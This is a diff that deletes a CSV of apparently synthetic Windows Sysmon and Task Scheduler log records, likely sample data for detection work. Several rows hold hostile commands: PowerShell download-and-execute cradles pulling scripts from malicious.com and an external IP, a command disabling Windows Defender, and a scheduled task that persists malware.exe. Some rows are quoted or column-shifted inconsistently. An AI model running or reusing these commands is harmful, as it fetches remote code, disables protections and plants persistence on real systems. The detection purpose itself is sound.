@@ -1,9 +1,0 @@
-timestamp,event_id,event_source,computer,user,process_name,command_line,parent_process_name,ip_source,ip_destination,port,protocol
-"2026-05-01T10:00:00Z,1,Microsoft-Windows-Sysmon/Operational,WIN-SRV-01,SYSTEM,powershell.exe,""powershell -nop -c \""IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')\"""",explorer.exe,192.168.1.100,104.28.15.200,443,TCP"
-"2026-05-01T10:05:00Z,1,Microsoft-Windows-Sysmon/Operational,WIN-SRV-01,SYSTEM,cmd.exe,""cmd /c net stop WinDefend"",explorer.exe,192.168.1.100,-,-,-"
-"2026-05-01T10:10:00Z,106,Microsoft-Windows-TaskScheduler/Operational,WIN-SRV-01,SYSTEM,-,-,schtasks.exe,""schtasks /create /tn \""WindowsUpdateCheck\"" /tr \""C:\\malware.exe\"" /sc hourly"",-,-,-,-"
-2026-05-01T10:15:00Z,4625,Microsoft-Windows-Security-Auditing,WIN-SRV-01,Admin,-,-,-,192.168.1.101,-,-,-
-2026-05-01T10:20:00Z,3,Microsoft-Windows-Sysmon/Operational,WIN-SRV-01,SYSTEM,-,-,-,192.168.1.100,104.28.15.200,80,TCP
-"2026-05-01T10:25:00Z,1,Microsoft-Windows-Sysmon/Operational,WIN-CL-01,User1,powershell.exe,""powershell -c Get-Process"",explorer.exe,192.168.1.102,-,-,-"
-"2026-05-01T10:30:00Z,1,Microsoft-Windows-Sysmon/Operational,WIN-SRV-02,SYSTEM,cmd.exe,""cmd /c whoami"",explorer.exe,192.168.1.103,-,-,-"
-"2026-05-01T10:35:00Z,1,Microsoft-Windows-Sysmon/Operational,WIN-SRV-02,SYSTEM,powershell.exe,""powershell -nop -c \""IEX (New-Object Net.WebClient).DownloadString('http://104.28.15.200/exploit.ps1')\"""",explorer.exe,192.168.1.103,104.28.15.200,443,TCP"
